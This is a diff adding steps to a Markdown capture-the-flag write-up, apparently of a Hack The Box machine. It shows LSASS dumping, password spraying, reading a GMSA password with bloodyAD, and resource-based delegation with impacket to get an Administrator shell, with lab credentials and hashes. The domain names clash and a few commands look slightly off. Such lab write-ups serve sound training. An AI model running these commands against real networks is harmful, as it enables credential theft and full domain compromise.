@@ -1153,7 +1153,7 @@ C:\tmp\procdump.exe -accepteula -ma lsass.exe C:\tmp\lsass.dmp
 Since we have the default password, we can expect multiple successful logins.
 
 ```bash
-nxc ldap 10.10.11.39 -u users.txt -p 'password' --continue-on-success
+nxc ldap 10.10.11.39 -u users.txt -p 'password' --continue-on-success 
 ```
 ![](https://cdn-images-1.medium.com/max/1000/1*b_Ss06SvagwxaqrH7EKK3A.png)
 
@@ -1165,6 +1165,45 @@ Some of these accounts also have WinRM access to the target machine
 nxc winrm 10.10.11.39 -u users.txt -p 'password' --continue-on-success
 ```
 ![](https://cdn-images-1.medium.com/max/1000/1*0_rjrPCO0otieqgVnP-TdA.png)
+
+Checking our BloodHound data we have now privilage users which could be used in domain escalation, Somw of our owned users members of the `Account Operators` and `Help Desk` Groups  
+
+![](https://cdn-images-1.medium.com/max/1000/1*O6eJdvOxAt2kMuef6IFxOg.png)
+
+### Read GMSA
+Rose.L → Account Operators → can ReadGMSAPassword for `GMSA-PClient01$` → that account has AllowedToAct on the DC → use Resource-Based Constrained Delegation (RBCD) to impersonate any domain user (including DA) to the DC → full domain compromise.
+
+In short:
+
++ We will use `Rose.L` creds to dump the GMSA password.
+
++ With `GMSA-PClient01$` creds, leverage the **AllowedToAct** permission for RBCD.
+
++ Request a TGS as any high-privilege user to the DC and execute commands.
+
+GMSA Read
+
+```bash
+bloodyAD --host dc01.vintage.htb --domain "university.htb" --dc-ip 10.10.11.39 -u Rose.L -p 'v3ryS0l!dP@sswd#X' get object 'GMSA-PCLIENT01$' --attr msDS-ManagedPassword 
+```
+![](https://cdn-images-1.medium.com/max/1000/1*UYeC0WzAtHLr6pHK6zMXBQ.png)
+
+### Impersonating Administrator
+
+1. Request ticket as administrator
+    ```bash
+    impacket-getST -dc-ip 10.10.11.39 -spn http/dc.university.htb -hashes :6D364C74FF11B3BCE0BC41C097BF55C8 -impersonate Administrator university.htb/'GMSAPCLIENT01$'
+
+    ```
+2. Export the ticket to use
+    ```bash
+    KRB5CCNAME=Administrator@http_dc.university.htb@UNIVERSITY.HTB.ccache
+    ```
+3. Authenticate as Administrator
+
+    ```bash
+    evil-winrm -i dc.university.htb -r university.htb 
+    ```
 
 ---
 
